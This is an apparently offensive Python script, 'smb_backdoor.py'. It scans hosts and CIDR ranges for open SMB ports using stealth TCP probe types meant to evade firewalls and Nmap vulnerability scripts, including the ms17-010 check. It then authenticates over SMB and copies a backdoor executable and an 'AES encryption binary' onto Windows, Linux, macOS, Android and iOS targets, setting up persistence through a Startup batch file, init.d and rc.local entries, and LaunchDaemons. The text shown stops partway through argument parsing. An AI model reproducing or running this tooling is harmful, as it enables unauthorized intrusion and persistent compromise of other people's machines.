#!/usr/bin/env python3
#
# smb_backdoor.py
#
# A combined SMB‐based scanner + remote “backdoor installer” script with enhanced 2025 Eternal Pulse capabilities.
# This script:
#   1. Scans a list of hosts/CIDRs to find open SMB (TCP port 445/139, UDP 137/138).
#   2. Uses Nmap’s NSE scripts to detect known vulnerabilities and enumerate shares.
#   3. Fingerprints OS via Nmap/Scapy.
#   4. Performs multiple probe methods (TCP connect, SYN, FIN, XMAS, NULL, ACK) to bypass firewall filtering.
#   5. Attempts share enumeration to detect hidden/admin shares/backdoors using Nmap NSE and parsing.
#   6. Optionally “installs a backdoor” on those hosts, depending on the detected or specified remote OS.
#      - Copies an AES encryption binary (compiled) to the target.
#      - Copies a backdoor executable/script to the target.
#      - Modifies persistence mechanisms on each OS to run the backdoor on next boot/login.
# Usage:
#   pip install cryptography smbprotocol python-nmap scapy
#
import argparse
import socket
import json
import concurrent.futures
import ipaddress
import sys
import os
import errno
import random
import asyncio
import select
import struct
import time
import math
import itertools
from datetime import datetime, timezone

import pathlib
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

try:
    from smbprotocol.connection import Connection
    from smbprotocol.session import Session
    from smbprotocol.tree import TreeConnect
    from smbprotocol.open import Open
    from smbprotocol.file import CreateDisposition, FileAttributes, CreateOptions, FilePipePrinterAccessMask
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

try:
    from scapy.all import IP, IPv6, TCP, ICMP, sr1, conf
    _SCAPY = True
except ImportError:
    _SCAPY = False

try:
    import nmap
    NM_AVAILABLE = True
except ImportError:
    NM_AVAILABLE = False

DEFAULT_ALLOWLIST = {
    "ips": [],
    "cidrs": []
}

class PublicIPFirewallSMB:
    class RoundRobin:
        def __init__(self, t): self._t = list(t)
        def __iter__(self): return iter(self._t)

    def __init__(self, allowlist=None, strategy="round", timeout=2, workers=100, verbose=True):
        self._nets, self._ips = self._load_allowlist(allowlist)
        self._timeout = timeout
        self._workers = workers
        self._verbose = verbose
        st_map = {"round": self.RoundRobin}
        self._strategy_cls = st_map.get(strategy, self.RoundRobin)
        self._tcp_ports = [445, 139]
        self._udp_ports = [137, 138]
        self._results = {}
        self._skipped = []

    def _log(self, *m):
        if self._verbose:
            print("[DBG]", *m, file=sys.stderr, flush=True)

    @staticmethod
    def _load_allowlist(src):
        if src is None:
            d = DEFAULT_ALLOWLIST
        elif isinstance(src, dict):
            d = src.get("allow", src)
        else:
            with open(src) as f:
                d = json.load(f).get("allow", json.load(f))
        nets, ips = [], set()
        for t in list(d.get("ips", [])) + list(d.get("cidrs", [])):
            try:
                if "/" in t:
                    nets.append(ipaddress.ip_network(t, strict=False))
                else:
                    ips.add(ipaddress.ip_address(t))
            except ValueError:
                pass
        return nets, ips

    @staticmethod
    def _allowed(ip, nets, ips):
        a = ipaddress.ip_address(ip)
        return a in ips or any(a in n for n in nets)

    @staticmethod
    def _fam(ip):
        return socket.AF_INET6 if ipaddress.ip_address(ip).version == 6 else socket.AF_INET

    def _tcp_connect(self, h, p):
        s = socket.socket(self._fam(h), socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((h, p))
            return "open"
        except socket.timeout:
            return "filtered"
        except ConnectionRefusedError:
            return "closed"
        except OSError as e:
            if e.errno in (errno.EHOSTUNREACH, errno.ENETUNREACH):
                return "unreachable"
            return "error"
        finally:
            s.close()

    def _tcp_syn(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="S")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="S"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x12:
                    return "open"
                if fl & 0x14:
                    return "closed"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("syn err", h, p, e)
            return "error"

    def _tcp_fin(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="F")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="F"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x14:
                    return "closed"
                return "open"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("fin err", h, p, e)
            return "error"

    def _tcp_xmas(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="FPU")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="FPU"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x14:
                    return "closed"
                return "open"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("xmas err", h, p, e)
            return "error"

    def _tcp_null(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags=0)) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags=0))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x14:
                    return "closed"
                return "open"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("null err", h, p, e)
            return "error"

    def _tcp_ack(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="A")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="A"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                return "filtered"
            return "open"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("ack err", h, p, e)
            return "error"

    def _udp_state(self, h, p):
        s = socket.socket(self._fam(h), socket.SOCK_DGRAM)
        s.settimeout(self._timeout)
        try:
            s.sendto(b"", (h, p))
            try:
                s.recvfrom(1024)
                return "open"
            except socket.timeout:
                return "open|filtered"
        except OSError as e:
            if e.errno == errno.ECONNREFUSED:
                return "closed"
            return "error"
        finally:
            s.close()

    def _probe_port(self, h, p, proto):
        if proto == "tcp":
            st = self._tcp_connect(h, p)
            if st == "open":
                return "open"
            st_syn = self._tcp_syn(h, p)
            if st_syn == "open":
                return "open"
            st_null = self._tcp_null(h, p)
            if st_null == "open":
                return "open"
            if st in ("filtered", "closed") and st_syn in ("filtered", "closed") and st_null in ("filtered", "closed"):
                st_fin = self._tcp_fin(h, p)
                if st_fin == "open":
                    return "open"
                st_xmas = self._tcp_xmas(h, p)
                if st_xmas == "open":
                    return "open"
                st_ack = self._tcp_ack(h, p)
                return st_ack
            return st_syn
        return self._udp_state(h, p)

    async def _async_scan(self, order):
        loop = asyncio.get_running_loop()
        futs = [loop.run_in_executor(None, self._probe_host, h) for h in order]
        for h, r in zip(order, await asyncio.gather(*futs, return_exceptions=True)):
            res = r if not isinstance(r, Exception) else {"error": str(r)}
            self._results[h] = res
            status = "success" if self._is_success(res) else "fail"
            self._log("RESULT", h, status, res.get("ports", res))
        return self._results

    def scan(self, hosts=None, cidrs=None, async_mode=False):
        t = list(self._iter_targets(hosts or [], cidrs or []))
        t = self._filter_targets(t)
        if not t:
            self._log("No targets after filtering")
            return {}
        order = list(self._strategy_cls(t))
        if async_mode:
            asyncio.run(self._async_scan(order))
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self._workers) as ex:
                fs = {ex.submit(self._probe_host, h): h for h in order}
                for f in concurrent.futures.as_completed(fs):
                    h = fs[f]
                    try:
                        res = f.result()
                        self._results[h] = res
                    except Exception as e:
                        self._results[h] = {"error": str(e)}
                    status = "success" if self._is_success(self._results[h]) else "fail"
                    self._log("RESULT", h, status, self._results[h].get("ports", self._results[h]))
        self._log("Scan finished", len(self._results), "scanned", len(self._skipped), "skipped", len(self.successful_routes()), "successful")
        return self._results

    def _probe_host(self, h):
        res = {"host": h, "ports": {}}
        for p in self._tcp_ports:
            res["ports"][p] = {"protocol": "tcp", "state": self._probe_port(h, p, "tcp")}
        for p in self._udp_ports:
            res["ports"][p] = {"protocol": "udp", "state": self._probe_port(h, p, "udp")}
        return res

    @staticmethod
    def _iter_targets(hosts, cidrs):
        for h in hosts:
            yield h
        for c in cidrs:
            for ip in ipaddress.ip_network(c, strict=False):
                yield str(ip)

    def _filter_targets(self, t):
        a, seen = [], set()
        for x in t:
            if x in seen:
                continue
            seen.add(x)
            if self._allowed(x, self._nets, self._ips):
                self._log("ALLOWED", x)
                a.append(x)
            else:
                self._log("SKIPPED", x)
                self._skipped.append(x)
        return a

    def _is_success(self, r):
        for p in (445, 139):
            if r["ports"].get(p, {}).get("state") == "open":
                return True
        return False

    def successful_routes(self):
        s, ts = [], datetime.now(timezone.utc).isoformat()
        for h, r in self._results.items():
            if self._is_success(r):
                for p in (445, 139):
                    if r["ports"].get(p, {}).get("state") == "open":
                        hf = ("0.0.0.0/0" if ipaddress.ip_address(h).version == 4 else "::/0")
                        s.append({"id": f"{hf}:{p}", "host": hf, "port": p, "details": r, "ts": ts})
                        break
        self._log("Filter successful" if s else "Filter unsuccessful", len(s), "routes")
        return s

    def save_routes(self, path):
        if not path:
            return
        d = self.successful_routes()
        if not d:
            return
        e = self.load_routes(path) or []
        m = {r["id"]: r for r in e}
        for r in d:
            m[r["id"]] = r
        with open(path, "w") as f:
            json.dump(list(m.values()), f, indent=2)

    @staticmethod
    def load_routes(path):
        if path and os.path.isfile(path):
            with open(path) as f:
                return json.load(f)
        return None

def load_rsa_private_key(path: str):
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_private_key(pem, password=None)

def load_rsa_public_key(path: str):
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_public_key(pem)

def sign_install_request(private_key, target: str, timestamp: str):
    payload = {"target": target, "timestamp": timestamp}
    payload_bytes = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    signature = private_key.sign(payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    return payload_bytes, signature

def fingerprint_os_nmap(host: str):
    if not NM_AVAILABLE:
        return None
    nm = nmap.PortScanner()
    try:
        nm.scan(host, arguments='-O -Pn')
        if 'osmatch' in nm[host]:
            matches = nm[host]['osmatch']
            if matches:
                return matches[0]['name']
    except Exception:
        pass
    return None

def fingerprint_os_scapy(host: str):
    if not _SCAPY:
        return None
    try:
        pkt = (IPv6(dst=host)/TCP(dport=445, flags="S")) if ipaddress.ip_address(host).version == 6 else (IP(dst=host)/TCP(dport=445, flags="S"))
        ans = sr1(pkt, timeout=2, verbose=0)
        if ans and ans.haslayer(TCP):
            ttl = ans.ttl
            window = ans.window
            if ttl <= 64:
                return "Linux/Android"
            elif ttl <= 128:
                return "Windows"
            else:
                return "macOS/iOS"
    except Exception:
        pass
    return None

def detect_os(host: str):
    os_nm = fingerprint_os_nmap(host)
    if os_nm:
        return os_nm
    return fingerprint_os_scapy(host)

def run_nse_vuln(host: str):
    if not NM_AVAILABLE:
        return None
    nm = nmap.PortScanner()
    try:
        nm.scan(host, arguments='-Pn -sV --script vuln')
        return nm[host]
    except Exception:
        return None

def run_smb_nse(host: str):
    if not NM_AVAILABLE:
        return None
    nm = nmap.PortScanner()
    try:
        nm.scan(host, arguments='-p 445 -Pn --script smb-os-discovery,smb-protocols,smb-enum-shares,smb-vuln-ms17-010')
        return nm[host]
    except Exception:
        return None

def enumerate_samba_shares(host: str):
    if not NM_AVAILABLE:
        return []
    nm_host = run_smb_nse(host)
    shares = []
    try:
        proto_info = nm_host.get('tcp', {}).get(445, {})
        script = proto_info.get('script', {})
        smb_enum = script.get('smb-enum-shares', "")
        for line in smb_enum.splitlines():
            if "Sharename:" in line:
                parts = line.split()
                if len(parts) >= 2:
                    name = parts[1].strip()
                    shares.append(name)
    except Exception:
        pass
    return shares

def install_backdoor_windows(host: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, domain: str = "", use_kerberos: bool = False):
    if not SMB_AVAILABLE:
        return False
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception:
        return False
    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception:
        return False
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        if use_kerberos:
            session = Session(conn, username=username, password=password, require_encryption=True, use_kerberos=True)
        else:
            session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\C$")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tools_dir = Open(tree, "Windows\\Tools", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA | FilePipePrinterAccessMask.FILE_CREATE_CHILD, disposition=CreateDisposition.FILE_OPEN_IF, options=CreateOptions.FILE_DIRECTORY_FILE)
        tools_dir.create(timeout=5)
        tools_dir.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    aes_name = os.path.basename(aes_binary_path).replace("\\", "/")
    try:
        with open(aes_binary_path, "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        aes_file = Open(tree, f"Windows\\Tools\\{aes_name}", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_file.create(timeout=5)
        aes_file.write(data, 0)
        aes_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    backdoor_name = os.path.basename(backdoor_binary_path).replace("\\", "/")
    try:
        with open(backdoor_binary_path, "rb") as f:
            data2 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        bd_file = Open(tree, f"Windows\\Tools\\{backdoor_name}", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_file.create(timeout=5)
        bd_file.write(data2, 0)
        bd_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    startup_path = "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\install_backdoor.bat"
    content = f"@echo off\r\nstart \"\" \"C:\\Windows\\Tools\\{backdoor_name}\"\r\n"
    try:
        startup_file = Open(tree, startup_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        startup_file.create(timeout=5)
        startup_file.write(content.encode("utf-8"), 0)
        startup_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_linux(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_script_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception:
        return False
    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception:
        return False
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    aes_name = "aes_encrypt"
    try:
        with open(aes_binary_path, "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_path = f"usr/local/bin/{aes_name}"
        smb_file = Open(tree, dest_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        smb_file.create(timeout=5)
        smb_file.write(data, 0)
        smb_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        aes_attrs = Open(tree, dest_path, access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_attrs.create(timeout=5)
        aes_attrs.close()
    except Exception:
        pass
    backdoor_name = os.path.basename(backdoor_binary_path)
    try:
        with open(backdoor_binary_path, "rb") as f:
            data2 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_path2 = f"usr/local/bin/{backdoor_name}"
        smb_file2 = Open(tree, dest_path2, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        smb_file2.create(timeout=5)
        smb_file2.write(data2, 0)
        smb_file2.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        bd_attrs = Open(tree, f"usr/local/bin/{backdoor_name}", access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_attrs.create(timeout=5)
        bd_attrs.close()
    except Exception:
        pass
    backdoor_sh_name = os.path.basename(backdoor_script_path)
    try:
        with open(backdoor_script_path, "rb") as f:
            data3 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_path3 = f"etc/init.d/{backdoor_sh_name}"
        smb_file3 = Open(tree, dest_path3, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        smb_file3.create(timeout=5)
        smb_file3.write(data3, 0)
        smb_file3.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        sh_attrs = Open(tree, f"etc/init.d/{backdoor_sh_name}", access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        sh_attrs.create(timeout=5)
        sh_attrs.close()
    except Exception:
        pass
    try:
        rc_file = Open(tree, "etc/rc.local", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OPEN_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        rc_file.create(timeout=5)
        raw = b""
        offset = 0
        while True:
            chunk = rc_file.read(4096, offset)
            if not chunk:
                break
            raw += chunk
            offset += len(chunk)
        text = raw.decode("utf-8", errors="ignore")
        if f"/etc/init.d/{backdoor_sh_name}" not in text:
            if not text.endswith("\n"):
                text += "\n"
            text += f"/etc/init.d/{backdoor_sh_name} &\n"
            rc_file.write(text.encode("utf-8"), 0)
        rc_file.close()
    except Exception:
        try:
            rc_new = Open(tree, "etc/rc.local", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
            rc_new.create(timeout=5)
            content = f"#!/bin/sh\n/etc/init.d/{backdoor_sh_name} &\n"
            rc_new.write(content.encode("utf-8"), 0)
            rc_new.close()
        except Exception:
            pass
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_macos(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_plist_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception:
        return False
    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception:
        return False
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    aes_name = "aes_encrypt"
    try:
        with open(aes_binary_path, "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_aes = f"usr/local/bin/{aes_name}"
        aes_file = Open(tree, dest_aes, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_file.create(timeout=5)
        aes_file.write(data, 0)
        aes_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        aes_attrs = Open(tree, dest_aes, access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_attrs.create(timeout=5)
        aes_attrs.close()
    except Exception:
        pass
    backdoor_name = os.path.basename(backdoor_binary_path)
    try:
        with open(backdoor_binary_path, "rb") as f:
            data2 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_bd = f"usr/local/bin/{backdoor_name}"
        bd_file = Open(tree, dest_bd, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_file.create(timeout=5)
        bd_file.write(data2, 0)
        bd_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        bd_attrs = Open(tree, dest_bd, access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_attrs.create(timeout=5)
        bd_attrs.close()
    except Exception:
        pass
    plist_name = os.path.basename(backdoor_plist_path)
    try:
        with open(backdoor_plist_path, "rb") as f:
            data3 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_plist = f"Library/LaunchDaemons/{plist_name}"
        plist_file = Open(tree, dest_plist, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        plist_file.create(timeout=5)
        plist_file.write(data3, 0)
        plist_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_android(host: str, share: str, username: str, password: str, apks_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    apk_name = os.path.basename(apks_path)
    try:
        with open(apks_path, "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_apk = f"sdcard/{apk_name}"
        apk_file = Open(tree, dest_apk, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        apk_file.create(timeout=5)
        apk_file.write(data, 0)
        apk_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_ios(host: str, share: str, username: str, password: str, ipas_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    ipa_name = os.path.basename(ipas_path)
    try:
        with open(ipas_path, "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_ipa = f"private/var/mobile/Media/{ipa_name}"
        ipa_file = Open(tree, dest_ipa, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        ipa_file.create(timeout=5)
        ipa_file.write(data, 0)
        ipa_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

def install_backdoor_cloud(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_script_path: str, cloud_provider: str):
    return install_backdoor_linux(host=host, share=share, username=username, password=password, private_key_path=private_key_path, server_public_key_path=server_public_key_path, aes_binary_path=aes_binary_path, backdoor_binary_path=backdoor_binary_path, backdoor_script_path=backdoor_script_path)

def main():
    p = argparse.ArgumentParser(description="Enhanced SMB Scanner + Eternal Pulse Backdoor Installer")
    p.add_argument("--host", action="append", default=[], help="Specify hosts to scan/install.")
    p.add_argument("--cidr", action="append", default=[], help="Specify CIDR ranges to scan.")
    p.add_argument("--input", help="File with newline‐separated hostnames/IPs.")
    p.add_argument("--timeout", type=int, default=2, help="Connection timeout.")
    p.add_argument("--workers", type=int, default=100, help="Parallel scanning threads.")
    p.add_argument("--json", action="store_true", help="Output JSON of successful routes.")
    p.add_argument("--allowlist", help="Optional JSON file with allowlist.")
    p.add_argument("--strategy", choices=["round"], default="round", help="Target ordering strategy.")
    p.add_argument("--save", help="Save successful routes to JSON.")
    p.add_argument("--reload", help="Reload previous scan results from JSON.")
    p.add_argument("--asyncio", action="store_true", help="Use asyncio for parallel scanning.")
    p.add_argument("--quiet", action="store_true", help="Suppress debug logs.")

    p.add_argument("--install-backdoor", action="store_true", help="Install backdoor on discovered SMB hosts.")
    p.add_argument("--remote-os", choices=["windows", "linux", "macos", "android", "ios", "aws", "azure", "gcp"], help="Remote OS or cloud type.")
    p.add_argument("--share", help="Samba share name (root for Linux/macOS, sdcard for Android, private/var/mobile/Media for iOS, root for cloud).")
    p.add_argument("--key", help="Path to RSA-2048 private key (PEM).")
    p.add_argument("--server-pubkey", help="Path to server’s RSA-2048 public key (PEM).")
    p.add_argument("--username", help="SMB username.")
    p.add_argument("--password", help="SMB password.")
    p.add_argument("--domain", default="", help="SMB domain (optional).")
    p.add_argument("--use-kerberos", action="store_true", help="Use Kerberos for SMB session.")
    p.add_argument("--aes-binary", help="Local path to the AES encryptor binary.")
    p.add_argument("--backdoor-binary", help="Local path to the backdoor binary/executable.")
    p.add_argument("--backdoor-script", help="Local path to the Linux init script (for cloud/Linux).")
    p.add_argument("--backdoor-plist", help="Local path to the macOS LaunchDaemon plist.")
